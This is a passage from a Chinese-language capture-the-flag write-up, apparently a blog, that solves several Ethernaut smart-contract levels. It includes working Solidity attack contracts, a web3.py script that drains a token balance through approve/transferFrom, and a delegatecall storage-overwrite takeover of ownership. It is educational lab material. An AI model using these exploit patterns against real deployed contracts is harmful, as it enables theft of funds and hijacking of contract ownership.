<p>gateTwo 中使用了内联汇编，功能是获取调用者的代码大小，判断其为0才能通过。题目叫我去看内联汇编和黄皮书，看看先：</p>
<p><a class="link"   href="https://docs.soliditylang.org/zh/v0.8.20/assembly.html" >关于内联汇编 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://docs.soliditylang.org/zh/v0.8.20/yul.html#yul" >关于 Yul <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://ethereum.github.io/yellowpaper/paper.pdf" >Ethereum 黄皮书 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>从黄皮书中看到如下一段话：</p>
<blockquote>
<p>7.1. <strong>Subtleties.</strong> Note that while the initialisation code is executing,the newly created address exists but with no intrinsic body code^5^. Thus any message call received by it during this time causes no code to be executed. If the initialisation execution ends with a SELFDESTRUCT instruction, the matter is moot since the account will be deleted before the transaction is completed.For a normal STOP code, or if the code returned is otherwise empty, then the state is left with a zombie account, and any remaining balance will be locked into the account forever.</p>
<p>^5^During initialization code execution, EXTCODESIZE on the address should return zero,which is the length of the code of the account while CODESIZE should return the length of the initialization code (as defined in H.2).</p>
</blockquote>
<p>说得很清楚，在合约的初始化代码执行过程中，新创建的地址是存在的，但没有内在的主题代码。即该地址上的 ESXTCODESIZE 此时返回0，可以满足题目的条件。</p>
<p><strong>gateThree</strong>：</p>
<p><code>abi.encodePacked()</code>是一种非标准的打包方式，其中规则如下：</p>
<ul>
<li>短于32字节的类型直接连接，没有填充或符号扩展。</li>
<li>动态类型是直接编码的，没有长度。</li>
<li>数组元素被填充，但仍被是直接编码。</li>
</ul>
<p>此外，不支持结构以及嵌套数组。</p>
<p>本题中只对<code>msg.sender</code>进行编码，很显然结果就是它的地址的字节序列。那么只需要计算一下就能得出<code>uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))</code>的值，只是由于本题需要在构造函数中完成对目标合约 enter 函数的调用，所以这个值不能提前计算，而是要在构造函数中直接计算。一旦构造函数开始运行，这个新创建的合约的地址就存在了，所以我们具备计算出它的条件。</p>
<h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><p>攻击合约如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">    GatekeeperTwo public myGate;</span><br><span class="line">    bytes8 public gateKey;</span><br><span class="line"></span><br><span class="line">    constructor(address _target) public &#123;</span><br><span class="line">        myGate = GatekeeperTwo(_target);</span><br><span class="line">        gateKey = bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));</span><br><span class="line">        myGate.enter(gateKey);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311301346739.png"
                      alt="image-20231130134636673"
                ></p>
<h2 id="15-Naught-Coin"><a href="#15-Naught-Coin" class="headerlink" title="15 Naught Coin"></a>15 Naught Coin</h2><h3 id="Code-2"><a href="#Code-2" class="headerlink" title="Code"></a>Code</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract NaughtCoin is ERC20 &#123;</span><br><span class="line">    // string public constant name = &#x27;NaughtCoin&#x27;;</span><br><span class="line">    // string public constant symbol = &#x27;0x0&#x27;;</span><br><span class="line">    // uint public constant decimals = 18;</span><br><span class="line">    uint256 public timeLock = block.timestamp + 10 * 365 days;</span><br><span class="line">    uint256 public INITIAL_SUPPLY;</span><br><span class="line">    address public player;</span><br><span class="line"></span><br><span class="line">    constructor(address _player) ERC20(&quot;NaughtCoin&quot;, &quot;0x0&quot;) &#123;</span><br><span class="line">        player = _player;</span><br><span class="line">        INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));</span><br><span class="line">        // _totalSupply = INITIAL_SUPPLY;</span><br><span class="line">        // _balances[player] = INITIAL_SUPPLY;</span><br><span class="line">        _mint(player, INITIAL_SUPPLY);</span><br><span class="line">        emit Transfer(address(0), player, INITIAL_SUPPLY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint256 _value)</span><br><span class="line">        public</span><br><span class="line">        override</span><br><span class="line">        lockTokens</span><br><span class="line">        returns (bool)</span><br><span class="line">    &#123;</span><br><span class="line">        super.transfer(_to, _value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Prevent the initial owner from transferring tokens until the timelock has passed</span><br><span class="line">    modifier lockTokens() &#123;</span><br><span class="line">        if (msg.sender == player) &#123;</span><br><span class="line">            require(block.timestamp &gt; timeLock);</span><br><span class="line">            _;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            _;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Description-2"><a href="#Description-2" class="headerlink" title="Description"></a>Description</h3><p>NaughtCoin is an ERC20 token and you’re already holding all of them. The catch is that you’ll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.</p>
<p> Things that might help</p>
<ul>
<li>The <a class="link"   href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md" >ERC20 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> Spec</li>
<li>The <a class="link"   href="https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contracts" >OpenZeppelin <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> codebase</li>
</ul>
<h3 id="Analysis-2"><a href="#Analysis-2" class="headerlink" title="Analysis"></a>Analysis</h3><p>题目是一个 ERC-20 标准的代币合约，其继承于 OppenZepplin Contracts 的 ERC20 合约，其解析见 <a href="/2023/12/03/%E6%B5%85%E6%9E%90ERC-20">浅析ERC-20</a>。</p>
<p>题目要求要把我们手里的余额花完，但是修改器<code>lockTokens</code>检测到<code>msg.sender</code>为玩家时会判断时间戳，要十年后才能解锁。但是当 sender 不是玩家的时候就会直接执行 transfer 了。</p>
<p>看完 ERC-20 就知道可以把自己账户中的余额授权给另一个账户以供使用，这样就可以使 sender 不是玩家，绕过修改器。</p>
<h3 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h3><p>python 攻击脚本如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line">web3 = Web3(Web3.HTTPProvider(<span class="string">&#x27;https://rpc.sepolia.org&#x27;</span>))</span><br><span class="line"></span><br><span class="line">player_address = <span class="string">&#x27;PLAYER_ADD&#x27;</span></span><br><span class="line">player_pk = <span class="string">&#x27;PLAYER_PK&#x27;</span></span><br><span class="line"></span><br><span class="line">hacker_address = <span class="string">&#x27;HACKER_ADD&#x27;</span></span><br><span class="line">hacker_pk = <span class="string">&#x27;HACKER_PK&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 合约abi，太长，不放上去了</span></span><br><span class="line">target_abi = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">target_address = <span class="string">&#x27;GAME_ADD&#x27;</span></span><br><span class="line">target_conctract = web3.eth.contract(abi=target_abi, address=target_address)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aprrove</span>():</span></span><br><span class="line">    player_balance = target_conctract.functions.balanceOf(player_address).call()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Before hacking raw balance: &quot;</span> + <span class="built_in">str</span>(player_balance))</span><br><span class="line"></span><br><span class="line">    nonce = web3.eth.get_transaction_count(player_address)</span><br><span class="line">    approve = target_conctract.functions.approve(hacker_address, player_balance).build_transaction(&#123;</span><br><span class="line">        <span class="string">&#x27;from&#x27;</span>: player_address,</span><br><span class="line">        <span class="string">&#x27;nonce&#x27;</span>: nonce</span><br><span class="line">        &#125;)</span><br><span class="line">    signed_approve = web3.eth.account.sign_transaction(approve, private_key=player_pk)</span><br><span class="line"></span><br><span class="line">    approve_hash = web3.eth.send_raw_transaction(signed_approve.rawTransaction)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Approve transaction hash: &quot;</span> + approve_hash.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack</span>():</span></span><br><span class="line">    player_balance = target_conctract.functions.balanceOf(player_address).call()</span><br><span class="line"></span><br><span class="line">    nonce = web3.eth.get_transaction_count(hacker_address)</span><br><span class="line">    hack = target_conctract.functions.transferFrom(player_address, hacker_address, player_balance).build_transaction(&#123;</span><br><span class="line">        <span class="string">&quot;from&quot;</span>: hacker_address,</span><br><span class="line">        <span class="string">&quot;nonce&quot;</span>: nonce</span><br><span class="line">        &#125;)</span><br><span class="line">    signed_hack = web3.eth.account.sign_transaction(hack, private_key=hacker_pk)</span><br><span class="line"></span><br><span class="line">    hack_hash = web3.eth.send_raw_transaction(signed_hack.rawTransaction)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hack transaction hash: &quot;</span> + hack_hash.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line">    web3.eth.wait_for_transaction_receipt(hack_hash)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;After hacking raw balance: &quot;</span> + <span class="built_in">str</span>(target_conctract.functions.balanceOf(player_address).call()))</span><br><span class="line"></span><br><span class="line">aprrove()</span><br><span class="line">hack()</span><br></pre></td></tr></table></figure></div>

<p>执行，成功掏空玩家的 balance：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312041300675.png"
                      alt="image-20231204130058484"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312041301056.png"
                      alt="image-20231204130108992"
                ></p>
<h2 id="16-Preservation"><a href="#16-Preservation" class="headerlink" title="16 Preservation"></a>16 Preservation</h2><h3 id="Code-3"><a href="#Code-3" class="headerlink" title="Code"></a>Code</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line">    // public library contracts</span><br><span class="line">    address public timeZone1Library;</span><br><span class="line">    address public timeZone2Library;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 storedTime;</span><br><span class="line">    // Sets the function signature for delegatecall</span><br><span class="line">    bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));</span><br><span class="line"></span><br><span class="line">    constructor(</span><br><span class="line">        address _timeZone1LibraryAddress,</span><br><span class="line">        address _timeZone2LibraryAddress</span><br><span class="line">    ) &#123;</span><br><span class="line">        timeZone1Library = _timeZone1LibraryAddress;</span><br><span class="line">        timeZone2Library = _timeZone2LibraryAddress;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // set the time for timezone 1</span><br><span class="line">    function setFirstTime(uint256 _timeStamp) public &#123;</span><br><span class="line">        timeZone1Library.delegatecall(</span><br><span class="line">            abi.encodePacked(setTimeSignature, _timeStamp)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // set the time for timezone 2</span><br><span class="line">    function setSecondTime(uint256 _timeStamp) public &#123;</span><br><span class="line">        timeZone2Library.delegatecall(</span><br><span class="line">            abi.encodePacked(setTimeSignature, _timeStamp)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Simple library contract to set the time</span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line">    // stores a timestamp</span><br><span class="line">    uint256 storedTime;</span><br><span class="line"></span><br><span class="line">    function setTime(uint256 _time) public &#123;</span><br><span class="line">        storedTime = _time;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Description-3"><a href="#Description-3" class="headerlink" title="Description"></a>Description</h3><p>This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.</p>
<p>The goal of this level is for you to claim ownership of the instance you are given.</p>
<p> Things that might help</p>
<ul>
<li>Look into Solidity’s documentation on the <code>delegatecall</code> low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope.</li>
<li>Understanding what it means for <code>delegatecall</code> to be context-preserving.</li>
<li>Understanding how storage variables are stored and accessed.</li>
<li>Understanding how casting works between different data types.</li>
</ul>
<h3 id="Analysis-3"><a href="#Analysis-3" class="headerlink" title="Analysis"></a>Analysis</h3><p>题目中给我们强调了<code>delegatecall</code>的属性，这里我们需要知道，当使用委托调用去调用目标合约的函数时，使用的是调用者合约的存储空间，而不是被调用者合约的存储空间。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312051117752.png"
                     
                ></p>
<p>那么若是修改了被调用者合约中的状态变量，那么就会修改这些变量所在的插槽对应的调用者合约的插槽中的数据。</p>
<p>所以攻击就有了头绪：由于 LibraryContract 合约只有一个状态变量在 Slot_0，所以我们只能修改原合约中的 Slot_0 中的<code>timeZone1Library</code>变量为自己的攻击合约，这样在调用<code>setFirstTime</code>函数时就会对攻击合约进行委托调用，就可以修改原合约中的<code>owner</code>。</p>
<h3 id="Exploit-3"><a href="#Exploit-3" class="headerlink" title="Exploit"></a>Exploit</h3><p>先部署攻击合约：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">    address public useless;</span><br><span class="line">    address public use1e55;</span><br><span class="line">    address public owner;</span><br><span class="line">    Preservation target;</span><br><span class="line"></span><br><span class="line">    function setTimeZone1Library(address _target) public &#123;</span><br><span class="line">        target = Preservation(_target);</span><br><span class="line">        target.setFirstTime(uint160(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setTime(uint256 _us3less) public &#123;</span><br><span class="line">        owner = tx.origin;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">forge create --rpc-url https://rpc.sepolia.org --private-key &lt;CREATEOR_PRIVATE_KEY&gt; src/hack_16.sol:Hack</span><br></pre></td></tr></table></figure></div>

<p>首先调用<code>setTimeZone1Library</code>修改题目里面<code>timeZone1Library</code>的值，然后再调用题目合约中的<code>setFirstTime</code>修改 owner 就好啦。</p>
<p><del>不太行。。。。。gas 不够，把初始化 Preservation 和获取转换自己地址的代码放到构造函数里面吧</del>（出现这个问题是因为我疏忽了，没有去调节 Metamask 里面的 Gas 设置）：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">    address public useless;</span><br><span class="line">    address public use1e55;</span><br><span class="line">    address public owner;</span><br><span class="line">    Preservation target;</span><br><span class="line">    uint256 public self;</span><br><span class="line"></span><br><span class="line">    constructor(address _target) public &#123;</span><br><span class="line">        target = Preservation(_target);</span><br><span class="line">        self = uint256(uint160(address(this)))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setTimeZone1Library() public &#123;</span><br><span class="line">        target.setFirstTime(self);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setTime(uint256 _us3less) public &#123;</span><br><span class="line">        owner = tx.origin;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>部署时候加一个<code>--constructor-args</code>：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">forge create --rpc-url https://rpc.sepolia.org \</span><br><span class="line">--private-key &lt;CREATEOR_PRIVATE_KEY&gt; src/hack_16.sol:Hack \</span><br><span class="line">--constructor-args 0xC58963621d4CD62A40D409CEe607d9068DeA8267</span><br></pre></td></tr></table></figure></div>

<p>先调用攻合约的 setTimeZone1Library()，再调用目标合约的 setFirstTime() 即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312061024264.png"
                      alt="image-20231206102448156"
                ></p>
<h2 id="17-Recovery"><a href="#17-Recovery" class="headerlink" title="17 Recovery"></a>17 Recovery</h2><h3 id="Code-4"><a href="#Code-4" class="headerlink" title="Code"></a>Code</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Recovery &#123;</span><br><span class="line">    //generate tokens</span><br><span class="line">    function generateToken(string memory _name, uint256 _initialSupply) public &#123;</span><br><span class="line">        new SimpleToken(_name, msg.sender, _initialSupply);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line">    string public name;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    // constructor</span><br><span class="line">    constructor(</span><br><span class="line">        string memory _name,</span><br><span class="line">        address _creator,</span><br><span class="line">        uint256 _initialSupply</span><br><span class="line">    ) &#123;</span><br><span class="line">        name = _name;</span><br><span class="line">        balances[_creator] = _initialSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // collect ether in return for tokens</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        balances[msg.sender] = msg.value * 10;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // allow transfers of tokens</span><br><span class="line">    function transfer(address _to, uint256 _amount) public &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= _amount);</span><br><span class="line">        balances[msg.sender] = balances[msg.sender] - _amount;</span><br><span class="line">        balances[_to] = _amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // clean up after ourselves</span><br><span class="line">    function destroy(address payable _to) public &#123;</span><br><span class="line">        selfdestruct(_to);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Description-4"><a href="#Description-4" class="headerlink" title="Description"></a>Description</h3><p>A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent <code>0.001</code> ether to obtain more tokens. They have since lost the contract address.</p>
<p>This level will be completed if you can recover (or remove) the <code>0.001</code> ether from the lost contract address.</p>
<h3 id="Analysis-4"><a href="#Analysis-4" class="headerlink" title="Analysis"></a>Analysis</h3><p>这题要我们恢复第一个代币合约的创建者给出的 0.001ETH，应该是找到这个代币合约然后调用它的 destroy 就好。从生成代币的合约中找不到任何东西的，这里要用以太坊浏览器查看交易记录，找到对应的代币合约和 creator。使用 etherscan.io 这么个以太坊浏览器，首先查看题目给到的题目合约地址：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312061136843.png"
                      alt="image-20231206112323196"
                ></p>
<p>查看合约创建的交易调用过程：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312061159713.png"
                      alt="image-20231206115936652"
                ></p>
<p>这些东西都找到了，那么利用代币合约自带的 destroy 函数就能把 ETH 返还给 creator 了。</p>
<h3 id="Expoit"><a href="#Expoit" class="headerlink" title="Expoit"></a>Expoit</h3><p>Like this：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312061201645.png"
                      alt="image-20231206120146607"
                ></p>
<p>看看结果，成功自毁，把 0.001ETH 转给 creator 了：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312061203613.png"
                      alt="image-20231206120347572"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312061206447.png"
                      alt="image-20231206120608397"
                ></p>
<h2 id="18-MagicNumber"><a href="#18-MagicNumber" class="headerlink" title="18 MagicNumber"></a>18 MagicNumber</h2><h3 id="Code-5"><a href="#Code-5" class="headerlink" title="Code"></a>Code</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract MagicNum &#123;</span><br><span class="line">    address public solver;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function setSolver(address _solver) public &#123;</span><br><span class="line">        solver = _solver;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">    ____________/\\\_______/\\\\\\\\\_____        </span><br><span class="line">     __________/\\\\\_____/\\\///////\\\___       </span><br><span class="line">      ________/\\\/\\\____\///______\//\\\__      </span><br><span class="line">       ______/\\\/\/\\\______________/\\\/___     </span><br><span class="line">        ____/\\\/__\/\\\___________/\\\//_____    </span><br><span class="line">         __/\\\\\\\\\\\\\\\\_____/\\\//________   </span><br><span class="line">          _\///////////\\\//____/\\\/___________  </span><br><span class="line">           ___________\/\\\_____/\\\\\\\\\\\\\\\_ </span><br><span class="line">            ___________\///_____\///////////////__</span><br><span class="line">  */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Description-5"><a href="#Description-5" class="headerlink" title="Description"></a>Description</h3><p>To solve this level, you only need to provide the Ethernaut with a <code>Solver</code>, a contract that responds to <code>whatIsTheMeaningOfLife()</code> with the right number.</p>
<p>Easy right? Well… there’s a catch.</p>
<p>The solver’s code needs to be really tiny. Really reaaaaaallly tiny. Like freakin’ really really itty-bitty tiny: 10 opcodes at most.</p>
<p>Hint: Perhaps its time to leave the comfort of the Solidity compiler momentarily, and build this one by hand O_o. That’s right: Raw EVM bytecode.</p>
<p>Good luck!</p>
<h3 id="Analysis-5"><a href="#Analysis-5" class="headerlink" title="Analysis"></a>Analysis</h3><p>终于，要手搓字节码了吗？</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312061211391.jpg"
                      alt="349D63BA86A0B4F0C18295D04DCAD40D" style="zoom:67%;" 
                >

<p>这题目我这土鳖没看懂，又是<code>whatIsTheMeaningOfLife()</code>，注释里又来个数字42，两个关键词 Google 一下：</p>
<blockquote>
<p><em>42</em> is the answer to the “ultimate question of life, the universe, and everything,” a joke in Douglas Adams’s 1979 novel, <em>The Hitchhiker’s Guide to the Galaxy</em>.</p>
<p>42是“生命、宇宙和万物的终极问题”的答案，这是道格拉斯·亚当斯（Douglas Adams）1979年小说《银河系漫游指南》（The Hitchhiker’s Guide to the Galaxy）中的一个笑话。</p>
</blockquote>
<p>好好好，玩洋梗捏，鼠鼠我呀，看不懂呢。</p>
<p>回到正题，题目应该是要求我们部署一个合约，其要求是能返回数字42，且操作码数量限制在10个以内。</p>
<p>那么就需要去学习一下关于 EVM 字节码的知识，以及字节码是如何组成一个合约的。</p>
<p><a class="link"   href="https://www.evm.codes/" >An Ethereum Virtual Machine Opcodes Interactive Reference <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.openzeppelin.com/deconstructing-a-solidity-contract-part-i-introduction-832efd2d7737" >Deconstructing a Solidity Contract —Part I: Introduction <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>现在我们知道构建一个合约的功能需要有 Runtime Opcodes，而部署它需要有 Initialization Opcodes，我们先来构造 Runtime：</p>
<table>
<thead>
<tr>
<th>字节码</th>
<th>操作码</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>602a</td>
<td>PUSH1 0x2a</td>
<td>value 要写入内存的32字节值（数字42）</td>
</tr>
<tr>
<td>6080</td>
<td>PUSH1 0x80</td>
<td>offset 要写入内存的偏移量</td>
</tr>
<tr>
<td>52</td>
<td>MSTORE</td>
<td>MSTORE(offset, value)</td>
</tr>
<tr>
<td>6020</td>
<td>PUSH1 0x20</td>
<td>size 要返回的数据大小</td>
</tr>
<tr>
<td>6080</td>
<td>PUSH1 0x80</td>
<td>offset 数据在内存中的偏移量</td>
</tr>
<tr>
<td>f3</td>
<td>RETURN</td>
<td>RETURN(offset, size)</td>
</tr>
</tbody></table>
<p>602a60805260206080f3</p>
<p>这里就是我们合约所需的功能，具体是将数字42存入内存中，就可以返回该数字了。</p>
<p>部署合约所需的 Initialization Opcodes：</p>
<table>
<thead>
<tr>
<th>字节码</th>
<th>操作码</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>600a</td>
<td>PUSH1 0x0a</td>
<td>size 要复制的字节数量（Runtime Opcodes长度10字节）</td>
</tr>
<tr>
<td>60??</td>
<td>PUSH1 0x??</td>
<td>offset 要复制的代码的偏移量</td>
</tr>
<tr>
<td>6000</td>
<td>PUSH1 0x00</td>
<td>destOffset 要复制到内存中的目标偏移量</td>
</tr>
<tr>
<td>39</td>
<td>CODECOPY</td>
<td>CODECOPY(destOffset, offset, size)</td>
</tr>
<tr>
<td>600a</td>
<td>PUSH1 0x0a</td>
<td>size 要返回的数据大小（Runtime Opcodes长度10字节）</td>
</tr>
<tr>
<td>6000</td>
<td>PUSH1 0x00</td>
<td>offset 数据在内存中的偏移量</td>
</tr>
<tr>
<td>f3</td>
<td>RETURN</td>
<td>将 Runtime Opcodes 返回给 EVM</td>
</tr>
</tbody></table>
<p>600a60??600039600a6000f3</p>
<p>部署合约的字节码后面加上它的 Runtime Opcodes，就可以部署一个合约，所以我们部署合约所需的字节码是：</p>
<p>600a60??600039600a6000f3602a60805260206080f3</p>
<p>可以看到在上面一段字节码中，Runtime Opcodes 的偏移量为12，即0x0c，那么在 Initialization Opcodes 中用问号代替的值就是0c，全部的字节码如下：</p>
<p>600a600c600039600a6000f3602a60805260206080f3</p>
<h3 id="Exploit-4"><a href="#Exploit-4" class="headerlink" title="Exploit"></a>Exploit</h3><p>直接使用 web3.js 部署合约：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> sendTransaction(&#123;</span><br><span class="line">    <span class="attr">from</span>: player,</span><br><span class="line">    <span class="attr">data</span>: 600a600c600039600a6000f3602a60805260206080f3</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202401061527430.png"
                      alt="image-20240106152718373"
                ></p>
<p>上以太坊浏览器查看，得到部署的合约地址 0xCf86935aA103893Cf4513f589D76078Ce8da24bb：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202401061529478.png"
                      alt="image-20240106152947414"
                ></p>
<p>调用题目合约的 setSolver 方法即可：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.setSolver(<span class="string">&quot;0xCf86935aA103893Cf4513f589D76078Ce8da24bb&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202401061533314.png"
                      alt="image-20240106153318261"
                ></p>
<h2 id="19-Alien-Codex"><a href="#19-Alien-Codex" class="headerlink" title="19 Alien Codex"></a>19 Alien Codex</h2><h3 id="Code-6"><a href="#Code-6" class="headerlink" title="Code"></a>Code</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">import &quot;../helpers/Ownable-05.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract AlienCodex is Ownable &#123;</span><br><span class="line">    bool public contact;</span><br><span class="line">    bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">    modifier contacted() &#123;</span><br><span class="line">        assert(contact);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function makeContact() public &#123;</span><br><span class="line">        contact = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function record(bytes32 _content) public contacted &#123;</span><br><span class="line">        codex.push(_content);</span><br><span class="line">    